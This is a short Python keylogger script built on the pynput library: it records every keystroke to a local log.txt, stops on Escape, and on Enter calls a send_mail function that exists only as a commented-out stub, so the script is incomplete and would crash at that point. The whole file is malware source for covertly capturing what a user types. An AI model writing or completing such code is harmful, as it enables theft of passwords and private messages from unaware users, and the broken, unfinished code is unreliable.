import os 

from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open('log.txt','a') as f:
            f.write(str(key))
    except Exception as e:
        print(e)

def on_release(key):
    if key == Key.esc:
        f = open('log.txt','r+')
        biffer= f.read()
        f.close()
        return False
    
    if key == Key.enter:
        send_mail()
        
# def send_mail()
          
with Listener(on_release=on_release, on_press=on_press) as listener:
   listener.join()